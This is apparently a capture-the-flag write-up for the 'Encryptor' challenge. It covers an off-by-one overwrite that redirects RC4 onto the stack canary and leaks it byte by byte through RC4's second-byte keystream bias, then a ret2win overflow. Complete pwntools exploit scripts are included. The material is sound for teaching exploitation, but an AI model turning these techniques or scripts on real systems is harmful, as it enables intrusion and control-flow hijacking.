---
title: "Encryptor"
summary: "Leaking a stack canary using RC4 keystream bias, then ret2win."
date: 2025-11-08
topics: ["crypto", "pwn"]
ctfs: ["ept-25"]
tags: ["rc4", "stream-cipher", "stack-canary", "bias"]
draft: true
---

{{< katex >}}


> Grab your resident cryptographer and try our shiny new Encryption-As-A-Service!

``` sh
ncat --ssl encryptor-pwn.ept.gg 1337
```

---

The challenge provides a single ELF binary, `encryptor`, which exposes a menu-driven encryption service. On startup, it helpfully leaks the address of a forbidden function.

```
Welcome to the EPT encryptor!
Please behave yourself, and remember to stay away from a certain function at 0x55667a4c54f0!
1. Encrypt a message
2. Reset the key and encrypt again
3. Change offset
4. Exit
>
```

### Binary protections

All standard mitigations are enabled.

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Despite PIE, the address of `win()` is printed on startup, which removes the need for an infoleak later.

---

## Reverse engineering

### Encryption logic

Menu option 1 allows the user to encrypt an arbitrary string.

```c
if (menu_choice == 1) {
    printf("Enter string to encrypt\n> ");
    fgets(local_108,242,stdin);
    RC4(key,local_108 + local_18,local_1f8,local_108 + local_18);
    puts_hex(local_1f8);
    resetKey();
}
```

Two issues immediately stand out:

* `fgets()` reads **242 bytes** into a **240-byte buffer**
* The RC4 input pointer is offset by `local_18`

Relevant stack layout:

```c
uchar local_1f8 [240];  // ciphertext
char  local_108 [240];  // user input
```

This allows a **1-byte overwrite past `local_108`**, corrupting `local_18`, the RC4 input offset.

### Disabled offset control

There is a menu option intended to change this offset:

```
> 3
Sorry, offset function disabled due to abuse!
```

However, because `local_18` sits directly after the input buffer, the off-by-one write lets us modify it anyway.

---

## Stack layout and target

The relevant portion of the stack looks like this:

```
[ input buffer      ] 240 bytes
[ offset byte       ] 1 byte (+ padding)
[ stack canary      ] 8 bytes
[ saved rbp         ] 8 bytes
[ return address    ] 8 bytes
```

By controlling the RC4 input offset, we can align encryption over the stack canary bytes.

---

## RC4 keystream bias

RC4 is a stream cipher that generates a keystream `K` and encrypts via XOR:

$$
C = P \oplus K
$$

RC4 is known to have biased output bytes. In particular, the **second keystream byte** is biased toward `0x00` with probability:
$$
\Pr[K_2 = 0] = \frac{1}{128}
$$

instead of the uniform `1/256`.

This bias allows a **distinguishing attack**: if the plaintext byte is constant, the most frequent ciphertext byte converges to the plaintext value.

---

## Canary leakage via bias

By:

1. Forcing RC4 to encrypt a chosen stack byte
2. Aligning that byte with keystream position 2
3. Repeating encryption with fresh keys
4. Taking the most frequent ciphertext byte

we can recover that byte of plaintext.

Since stack canaries on amd64 always start with a null byte, only the remaining 7 bytes need to be recovered.

### Canary recovery script

```python
from pwn import *
from collections import Counter

p = process("./encryptor")

p.recvuntil(b"at ")
win = int(p.recvline().strip()[2:-1], 16)
print("Win:", hex(win))

def encrypt(msg):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", msg)
    p.recvuntil(b"Encrypted: ")
    return p.recvline().strip()

def reset_key():
    p.sendlineafter(b"> ", b"2")
    p.recvuntil(b"Encrypted: ")
    return p.recvline().strip()

def recover_canary_byte(i):
    encrypt(b"\x00" * 240 + p8(0xf7 + i))
    c = Counter()
    for _ in range(6000):
        ct = reset_key()
        b = int(ct[2:4], 16)
        c[b] += 1
    return c.most_common(1)[0][0]

canary = b"\x00" + bytes(recover_canary_byte(i) for i in range(1, 8))
print(f"canary = 0x{canary[::-1].hex()}")
```

Notes:

* The first canary byte is known to be `0x00`
* The attack is probabilistic; sample count may need adjustment
* Runtime is long on remote due to repeated key resets

Example output:

```
canary = 0x0d4fb028da4d3300
```

---

## ret2win

The binary contains a hidden menu option:

```c
if (menu_choice == 1337) {
    printf("Leaving already? Enter feedback:\n> ");
    fgets(local_108,288,stdin);
}
```

This reads **288 bytes into a 240-byte buffer**, allowing full control of the return address.

With the canary known and `win()` already leaked, exploitation is straightforward.

### Final payload

```python
payload  = b"A" * 248
payload += canary
payload += b"B" * 8
payload += p64(win)

p.sendlineafter(b"> ", b"1337")
p.sendlineafter(b"> ", payload)
p.interactive()
```

Successful execution:

```
EPT{local_test_flag_because_im_not_waiting_100_years_on_remote_again}
```

---

## Final solve script

Below is the consolidated exploit used locally and remotely.

```python
from pwn import *

elf = ELF("encryptor")
p = process(elf.path)

p.recvline()
win_addr = int(p.recvline().split(b"at ")[1][2:-1], 16)

canary = [0]

for i in range(1, 8):
    counts = {j: 0 for j in range(256)}

    p.sendlineafter(b">", b"1")
    payload = (b"\x00" * 240 + p8(0xf7 + i))[:241]
    p.sendafter(b">", payload)

    while True:
        p.sendlineafter(b">", b"2")
        ct = bytes.fromhex(p.recvline().split(b"Encrypted: ")[1].decode())
        counts[ct[1]] += 1

        m = max(counts, key=counts.get)
        if counts[m] - sorted(counts.values())[-2] > 5:
            canary.append(m)
            break

canary = bytes(canary)

p.sendlineafter(b">", b"1337")
p.sendlineafter(
    b">",
    b"A" * 0xf8 + canary + b"B" * 8 + p64(win_addr)
)

print(p.recvall().decode())
```

---

## Takeaways

* RC4 is catastrophically broken even in nonstandard settings
* Off-by-one writes are often enough to break strong mitigations
* Stack canaries do not help when they can be leaked byte-by-byte
* “Disabled” features still matter if memory safety is broken

This challenge is a good example of cryptographic weaknesses compounding memory corruption rather than replacing it.

